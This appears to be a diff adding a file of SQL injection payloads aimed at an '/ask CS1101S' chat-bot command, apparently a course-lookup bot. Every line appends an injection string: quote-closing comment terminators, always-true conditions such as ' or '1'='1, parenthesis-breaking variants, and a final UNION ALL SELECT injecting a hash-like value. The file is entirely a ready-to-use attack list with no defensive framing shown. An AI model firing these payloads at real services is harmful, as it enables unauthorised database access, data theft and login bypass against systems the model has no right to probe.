@@ -1,0 +1,21 @@
+/ask CS1101S ' --
+/ask CS1101S ' #
+/ask CS1101S '/*
+/ask CS1101S ' or '1'='1
+/ask CS1101S ' or '1'='1'--
+/ask CS1101S ' or '1'='1'#
+/ask CS1101S ' or '1'='1'/*
+/ask CS1101S 'or 1=1 or ''='
+/ask CS1101S ' or 1=1
+/ask CS1101S ' or 1=1--
+/ask CS1101S ' or 1=1#
+/ask CS1101S ' or 1=1/*
+/ask CS1101S ') or ('1'='1
+/ask CS1101S ') or ('1'='1'--
+/ask CS1101S ') or ('1'='1'#
+/ask CS1101S ') or ('1'='1'/*
+/ask CS1101S ') or '1'='1
+/ask CS1101S ') or '1'='1'--
+/ask CS1101S ') or '1'='1'#
+/ask CS1101S ') or '1'='1'/*
+/ask CS1101S ' AND 1=0 UNION ALL SELECT '*', '81dc9bdb52d04dc20036dbd8313ed055
